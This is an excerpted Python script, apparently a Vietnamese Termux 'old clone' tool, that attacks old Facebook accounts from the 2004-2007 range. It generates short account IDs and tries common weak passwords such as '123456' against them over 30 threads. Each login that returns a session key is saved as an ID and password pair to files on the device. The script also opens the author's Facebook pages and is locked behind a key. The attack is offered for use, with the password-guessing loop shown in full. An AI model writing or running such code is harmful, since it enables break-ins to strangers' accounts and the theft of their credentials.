...
# WhatsApp Group Link
channel_link = "https://www.facebook.com/bjnndzai/"

# Valid keys
approved_keys = ["xcdepzai"]

# --- ĐOẠN CODE TẠO TỆP SỐ ĐỂ QUÉT 2004-2007 ---
def create_scan_file():
    if not os.path.exists("day_so.txt"):
        with open("day_so.txt", "w") as f:
...
def first_step():
    ...
    os.system("termux-open-url https://www.facebook.com/bjnndzai/")
...
os.system('clear')
os.system("xdg-open 'https://www.facebook.com/doantrungduycutephomaiquecacbuyeuemvailon.MARK.M.M'")
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【TRAN XUAN CHINH】𓆪 \x07')
...
def ____banner____():
 ...
 ┊🥕 System : xcdepzai pro | tốc độ max speed
         Tools Made By VietNam
=====================================================
                TOOLS BY : TRAN XUAN CHINH 👾
\033[0m""")
...
def old_clone():
    ...
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mD\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2004-2007 series (UID SHORT)')
    linex()
...
def old_Tree():
    ...
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOOLS SCAN VIA SIÊU MÚP{Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTRAN XUAN CHINH{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
...
# --- HÀM OLD_FOUR MỚI CHO 2004-2007 (UID 5-8 CHỮ SỐ) ---
def old_Four():
    """
    Cloning method for accounts from 2004-2007 using UID short sequences.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2004-2007")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    try:
        with open("day_so.txt", "r") as f:
            lines = f.readlines()
            # Lọc các UID ngắn từ 10.000 đến 99.999.999 (5-8 chữ số)
            potential_uids = [l.strip() for l in lines if 5 <= len(l.strip()) <= 8]
            user = random.sample(potential_uids, min(int(limit), len(potential_uids)))
    except:
        # Dự phòng nếu không có file
        for _ in range(int(limit)):
            user.append(''.join(random.choices('0123456789', k=random.randint(5, 8))))
    ...
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOOL SCAN VIA SIÊU MÚP {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46m TRAN XUAN CHINH {G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
...
def login_1(uid):
    ...
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mTXC OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mTXC\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/TXC-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mTXC\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/TXC-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mDTD XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/TXC-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDTD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/TXC-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
